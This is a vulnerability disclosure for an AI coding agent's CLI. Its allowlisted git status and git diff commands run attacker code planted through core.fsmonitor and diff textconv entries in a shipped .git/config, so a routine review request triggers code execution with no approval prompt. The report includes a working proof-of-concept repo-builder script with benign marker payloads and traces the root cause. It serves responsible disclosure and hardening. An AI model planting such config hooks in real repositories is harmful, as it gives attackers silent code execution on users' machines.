issue.title: bug: RCE: allowlisted "read-only" git status/diff run attacker code from .git/config
issue.body: ### Component CLI ### Summary Related to #996 (same class — a delivered repository makes Git execute attacker code — but a **different, prompt-less trigger**). `git status`, `git diff`, and `git log` are on Vibe's **default shell allowlist**, so the agent runs them with `ToolPermission.ALWAYS` — **without any approval prompt**. But Git is configuration-driven, and several repository-local config keys are *commands Git executes for you*. An attacker who ships a crafted `.git` directory therefore gets **arbitrary code execution with the user's privileges the moment the agent runs a routine `git status` / `git diff`** — and, unlike #996, **no `--worktree` flag is required and no prompt is ever shown**. Whereas #996 abuses the `post-checkout` hook during `--worktree` creation, this abuses Git config values that are executed by the very commands Vibe auto-approves as "read-only": - `core.fsmonitor = ` → executed by **`git status`** - `diff..textconv = ` → executed by **`git diff`** (bound to a path via a tracked `.gitattributes` `*.ext diff=`; Git runs ` ` and uses stdout as the diff text, so the payload can `cat "$1"` and the diff still looks normal) `git clone` is **not** a vector (clone builds a fresh local config and does not import a remote `.git/config`). The realistic delivery is a repo whose `.git` arrives **as content**: a zip/tarball/shared folder the victim unpacks, a `git bundle`, or a nested repo — the "please review this project I downloaded" workflow. Because the victim unpacks it, the files are victim-owned, so Git's `safe.directory` check does not block the repo-local config. ### Reproduction steps ### Reproduction steps Malicious-repo builder (payload is benign — it writes proof markers to `/tmp`): File: `gen_git_repo.sh` ```bash #!/bin/bash REPO="POC_REPO" rm -rf "$REPO"; mkdir -p "$REPO"; cd "$REPO" git init # Innocuous content + a tracked .gitattributes binding app.txt to diff driver "pwn". echo "hello world" > app.txt printf 'app.txt diff=pwn\n' > .gitattributes git -c core.fsmonitor= add -A git -c core.fsmonitor= -c user.email=poc@x -c user.name=poc commit -m "Initial commit." echo "modified" >> app.txt # unstaged change so `git diff` runs the textconv driver # Payload scripts shipped inside .git/ (referenced from .git/config). cat > .git/payload_status.sh << 'EOF' #!/bin/sh id > /tmp/POC_git_status exit 0 EOF cat > .git/payload_diff.sh << 'EOF' #!/bin/sh id > /tmp/POC_git_diff cat "$1" EOF chmod +x .git/payload_status.sh .git/payload_diff.sh # Wire Git config to the payloads (this is what gets shipped in .git/config). git config core.fsmonitor "$PWD/.git/payload_status.sh" git config diff.pwn.textconv "$PWD/.git/payload_diff.sh" ``` Then: 1. Deliver `POC_REPO/` (including its `.git`) to the victim as a zip/tarball/folder. 2. In a Vibe session pointed at the repo, ask something a user naturally would, e.g. *"review the uncommitted changes in POC_REPO"* / *"show me the git diff"*. Vibe runs `git status` and `git diff` there — both are allowlisted, so they run **with no prompt**. 3. Verify code execution: `cat /tmp/POC_git_status /tmp/POC_git_diff` — both were created by the "read-only" git commands. Confirmation against Vibe's own code (from the repo root): ```python from vibe.core.tools.base import BaseToolState from vibe.core.tools.builtins.bash import Bash, BashArgs, BashToolConfig tool = Bash(lambda: BashToolConfig(), BaseToolState(), cwd="/path/to/POC_REPO") for c in ("git status", "git diff", "git log"): print(c, tool.resolve_permission(BashArgs(command=c)).permission) # -> always (no prompt) # await tool.run(BashArgs(command="git diff")) # drops /tmp/POC_git_diff ``` - CVSS 3.1 vector: /AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H - CVSS 3.1 score: 8.8 (High) ### Vulnerable code The default shell allowlist marks these Git subcommands as auto-approved (read-only), so `resolve_permission()` returns `ToolPermission.ALWAYS` and no approval prompt is shown: File: `vibe/core/tools/builtins/bash.py` (and the same list in `experimental_bash.py`) ```python def _get_default_allowlist() -> list[str]: common = ["cd", "echo", "git diff", "git log", "git status", "tree", "whoami"] return common + default_read_only_commands() ``` These are not read-only: their behavior depends on attacker-controllable repo-local Git config that Git executes. The project already recognizes this exact class — Vibe's **own** startup Git probe is hardened for it, but only there and only for `core.fsmonitor`: File: `vibe/core/system_prompt.py` ```python def _run_git(self, args, timeout): return subprocess.run( # -c core.fsmonitor= overrides (and disables) any fsmonitor hook a # repo's own .git/config declares... a malicious repo cloned/opened by # the user could otherwise use `[core] fsmonitor = ` to get its # command executed by `git status`/`git branch`/`git log` here... ["git", "-c", "core.fsmonitor=", "--no-optional-locks", *args], ... ) ``` That hardening is **not** applied to the allowlisted Git commands the model issues (a different code path, `Bash.run()` → `spawn_shell_command`), and it does not cover `diff..textconv` / `diff.external`, which the `git diff` PoC exploits. The command output ### Versions / environment mistral-vibe v2.25.0 (also present in earlier versions; both the legacy and managed/experimental shell tools share the allowlist) ### Logs & screenshots ```shell ```

steps: Prepare a local throwaway Git repository POC_REPO containing app.txt, configure user.name Fixture and user.email fixture@example.com, and commit the file. Add a non-destructive fsmonitor proof script at .git/payload_status.sh containing #!/bin/sh, then printf proof > fsmonitor-proof.txt, then exit 0. Make it executable and set core.fsmonitor to its absolute path. The only payload action is creating the proof file inside this disposable repository.
review the uncommitted changes in POC_REPO
expected: Routine Git inspection does not execute repository-supplied commands under an unchecked read-only permission classification.
defect: An allowlisted git status executes the repository-configured fsmonitor script without an ACP approval request.

fault location.explanation: Git status is treated as unconditionally read-only although core.fsmonitor names an executable from repository-local config. Startup probing may override fsmonitor, but legacy model-issued Bash commands do not apply that hardening.

Root cause: Git status is treated as unconditionally read-only although core.fsmonitor names an executable from repository-local config. Startup probing may override fsmonitor, but legacy model-issued Bash commands do not apply that hardening.
